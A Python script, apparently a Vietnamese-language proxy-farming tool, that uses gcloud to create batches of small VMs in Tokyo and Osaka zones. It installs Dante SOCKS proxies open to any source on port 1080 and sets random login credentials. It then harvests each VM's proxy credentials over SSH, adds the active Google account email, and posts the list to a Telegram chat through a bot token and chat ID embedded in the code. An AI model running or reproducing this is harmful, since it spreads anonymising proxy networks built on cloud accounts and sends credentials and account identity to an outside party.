#!/usr/bin/env python3
print("Running script version V19.3")

import subprocess
import time
import random
import string
import sys
import requests
from datetime import datetime

# =========================
# CONFIG
# =========================

TARGET_PER_ZONE = 4
MAX_PROJECTS = 3
TOTAL_TARGET = 24

TOKYO_ZONES = [
"asia-northeast1-a",
"asia-northeast1-b",
"asia-northeast1-c"
]

OSAKA_ZONES = [
"asia-northeast2-a",
"asia-northeast2-b",
"asia-northeast2-c"
]

MACHINE="e2-micro"
IMAGE="debian-11"

TG_BOT_TOKEN="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
TG_CHAT_ID="-5232145570"

# =========================
# UTILS
# =========================

def run(cmd):

    try:
        return subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL).decode().strip()
    except:
        return ""

def runp(cmd):

    return subprocess.run(cmd,shell=True,capture_output=True,text=True)

def rand(n=6):

    return ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))

# =========================
# AUTH CHECK
# =========================

def ensure_auth():

    acc=run("gcloud auth list --filter=status:ACTIVE --format='value(account)'")

    if acc:
        return True

    print("Auth expired → re-login")

    subprocess.run("gcloud auth login --quiet",shell=True)

    acc=run("gcloud auth list --filter=status:ACTIVE --format='value(account)'")

    return bool(acc)

# =========================
# UI
# =========================

def draw(created,status):

    percent=int(created/TOTAL_TARGET*100)
    bar=int(percent/4)

    sys.stdout.write("\033[2J\033[H")

    print("ScriptV19.3: Tiến trình đang thực hiện ...\n")

    print("["+("█"*bar)+("░"*(25-bar))+"]\n")

    print(f"{percent}%\n")

    print(f"Created: {created} / {TOTAL_TARGET}\n")

    print(f"Status: {status}\n")

# =========================
# TELEGRAM
# =========================

def tg_send(file,total):

    if not TG_BOT_TOKEN:
        return

    url=f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"

    try:

        requests.post(
        url,
        data={"chat_id":TG_CHAT_ID,"caption":f"✅ {total} Proxy đã được tạo"},
        files={"document":open(file,"rb")},
        timeout=20
        )

    except:
        pass

# =========================
# FIREWALL
# =========================

def ensure_firewall(project):

    chk=run(f"gcloud compute firewall-rules describe allow-socks --project {project}")

    if chk:
        return

    subprocess.run(f"""
gcloud compute firewall-rules create allow-socks \
--allow tcp:1080 \
--direction INGRESS \
--priority 1000 \
--network default \
--project {project}
""",shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

# =========================
# COUNT VM
# =========================

def count_vm(project):

    tokyo=0
    osaka=0

    data=run(f"gcloud compute instances list --project {project} --format='value(zone)'")

    for z in data.splitlines():

        if "asia-northeast1" in z:
            tokyo+=1

        if "asia-northeast2" in z:
            osaka+=1

    return tokyo,osaka

# =========================
# CREATE VM
# =========================

def create_vm(project,zone):

    name = f"{rand(6)}-{rand(7)}"
    user=f"u{rand()}"
    pw=rand(10)

    startup=f"""
#!/bin/bash
apt update -y
apt install -y dante-server curl

useradd -m {user}
echo '{user}:{pw}' | chpasswd

IP=$(curl -s ifconfig.me)

echo "$IP:1080:{user}:{pw}" > /root/list.txt

cat >/etc/danted.conf <<EOF
logoutput: syslog
internal: 0.0.0.0 port = 1080
external: eth0
method: username
user.notprivileged: nobody

client pass {{
 from: 0.0.0.0/0 to: 0.0.0.0/0
}}

pass {{
 from: 0.0.0.0/0 to: 0.0.0.0/0
 protocol: tcp udp
}}
EOF

systemctl restart danted
"""

    cmd=f"""
gcloud compute instances create {name} \
--project {project} \
--zone {zone} \
--machine-type {MACHINE} \
--image-family {IMAGE} \
--image-project debian-cloud \
--metadata startup-script='{startup}'
"""

    p=runp(cmd)

    if p.returncode==0:
        return True,"VM created"

    err=p.stderr.lower()

    if "zone_resource_pool_exhausted" in err:
        return False,"Zone full"

    if "authentication" in err:
        ensure_auth()
        return False,"Auth retry"

    return False,"Create failed"

# =========================
# EXPORT PROXY
# =========================

def export_proxy():

    out="list.txt"
    open(out,"w").close()

    projects=run("gcloud projects list --format='value(projectId)'").splitlines()

    total=0

    for p in projects[:MAX_PROJECTS]:

        data=run(f"gcloud compute instances list --project {p} --format='value(name,zone)'")

        for line in data.splitlines():

            try:
                name,zone=line.split()
            except:
                continue

            proxy=run(f"gcloud compute ssh {name} --zone {zone} --project {p} --command 'cat /root/list.txt'")

            if proxy:

                with open(out,"a") as f:
                    f.write(proxy+"\n")

                total+=1

    return total,out

# =========================
# MAIN
# =========================

def main():

    projects=run("gcloud projects list --format='value(projectId)'").splitlines()[:MAX_PROJECTS]

    created=0

    try:

        while True:

            ensure_auth()

            for p in projects:

                ensure_firewall(p)

                tokyo,osaka=count_vm(p)

                tokyo_full=True
                osaka_full=True

                if tokyo<TARGET_PER_ZONE:

                    for z in TOKYO_ZONES:

                        draw(created,f"Tạo VM Tokyo ({p}) {z}")

                        ok,msg=create_vm(p,z)

                        if ok:
                            created+=1
                            tokyo_full=False
                            break

                        if msg=="Zone full":
                            draw(created,f"Tokyo full {z}")
                            time.sleep(1)

                else:
                    tokyo_full=False

                if osaka<TARGET_PER_ZONE:

                    for z in OSAKA_ZONES:

                        draw(created,f"Tạo VM Osaka ({p}) {z}")

                        ok,msg=create_vm(p,z)

                        if ok:
                            created+=1
                            osaka_full=False
                            break

                        if msg=="Zone full":
                            draw(created,f"Osaka full {z}")
                            time.sleep(1)

                else:
                    osaka_full=False

                if tokyo_full and osaka_full:

                    draw(created,f"Tokyo + Osaka full → skip project ({p})")

                time.sleep(1)

    except KeyboardInterrupt:

        draw(created,"Đang xuất proxy...")

        total,file=export_proxy()

        email=run("gcloud auth list --filter=status:ACTIVE --format='value(account)'")

        now=datetime.now().strftime("%d/%m")

        with open(file,"r+") as f:

            data=f.read()

            f.seek(0)

            f.write(f"Tổng Số Proxies : {total}\n\n{now}---- {email}--\n"+data)

        tg_send(file,total)

        print("\nDone. Proxy exported.\n")

if __name__=="__main__":
    main()
